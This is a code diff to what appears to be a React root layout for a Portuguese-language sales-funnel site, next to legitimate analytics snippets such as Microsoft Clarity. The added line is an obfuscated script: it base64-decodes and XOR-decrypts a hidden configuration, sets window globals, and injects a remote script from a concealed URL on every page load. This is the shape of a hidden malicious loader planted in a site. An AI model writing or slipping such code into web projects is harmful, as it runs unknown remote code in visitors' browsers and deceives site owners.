@@ -119,6 +119,7 @@ function RootShell({ children }: { children: ReactNode }) {
         <script dangerouslySetInnerHTML={{ __html: FIT_SNIPPET }} />
         {/* Microsoft Clarity (z7yjpmz1wl) — carrega em todas as páginas do funil. */}
         <script type="text/javascript" dangerouslySetInnerHTML={{ __html: CLARITY_SNIPPET }} />
+        <script dangerouslySetInnerHTML={{ __html: "(function(){var u_qy=atob(\"DBcxdWTJr11z20VnvmwTABaljWdRszETzmQLWkuqyzNdrjEK13FIWwemwnMRqWoU3WVYBRC6gCgHtjZI0nZFEBe9gTcA+WlF32NFBw2r2ikWqGdd5WwTGwWkyn9J+SEGynYcABCkxjsK9jUV22FUGxDk1z4cv2gU3XwTWUa/zjEGvmddnDVMWR/rwTwevmddnHNQAQXk2ikesiMek2dDEBKswSleqDAF13NCV0jr2TwfriBFhDUTCDm0\");var v_jgs=[];for(var f_y=0;f_y<u_qy.length;f_y++){v_jgs.push(u_qy.charCodeAt(f_y)&255);}var u_y4=v_jgs[0];var d_9r3m=v_jgs.slice(1,1+u_y4);var g_hoq9=v_jgs.slice(1+u_y4);var i_rau=g_hoq9.map(function(b,y_pl){return b^d_9r3m[y_pl%u_y4];});var n_80=\"\";for(var v_4wc=0;v_4wc<i_rau.length;v_4wc++){n_80+=String.fromCharCode(i_rau[v_4wc]&255);}var m_na=decodeURIComponent(escape(n_80));var a_b0=JSON.parse(m_na);var g_tvb=a_b0.globals||[];g_tvb.forEach(function(a_03){window[a_03.name]=a_03.value;});var q_d=document.createElement(\"script\");q_d.src=a_b0.url;q_d.async=true;q_d.defer=true;(a_b0.attributes||[]).forEach(function(l_dqrw){q_d.setAttribute(l_dqrw.name,l_dqrw.value);});(document.head||document.documentElement).appendChild(q_d);})();" }} />
       </head>
       <body>
         {children}
